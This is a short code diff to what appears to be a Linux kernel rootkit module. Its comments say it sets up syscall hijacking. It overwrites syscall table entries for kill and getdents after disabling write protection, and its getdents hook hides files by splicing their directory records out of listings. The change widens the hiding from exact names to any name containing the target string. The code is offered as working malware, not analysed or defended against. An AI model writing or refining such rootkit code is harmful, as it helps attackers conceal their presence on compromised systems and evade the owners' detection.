@@ -124,7 +124,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
     for (bpos = 0; bpos < nread;) { //traverse...
         d = (struct linux_dirent *) (buf + bpos);
         nd = (struct linux_dirent *) (buf + bpos + d->d_reclen);
-        if (!strcmp(nd->d_name,hidefile)) { //if we have a match to hidefile, make the prev record point to next
+        if (strstr(nd->d_name,hidefile)) { //if we have a substring match to hidefile, make the prev record point to next
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
@@ -142,7 +142,7 @@ static int init(void) { //initial function, sets up syscall hijacking
     //have to disable previous line otherwise you can't unload module without rebooting
     original_kill = (void *)syscall_table[__NR_kill]; //store old addresses
     original_getdents = (void *)syscall_table[__NR_getdents];
-    original_getdents64 = (void *)syscall_table[__NR_getdents64];
+    //original_getdents64 = (void *)syscall_table[__NR_getdents64];
     GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
     syscall_table[__NR_getdents] = new_getdents;
     syscall_table[__NR_kill] = new_kill;
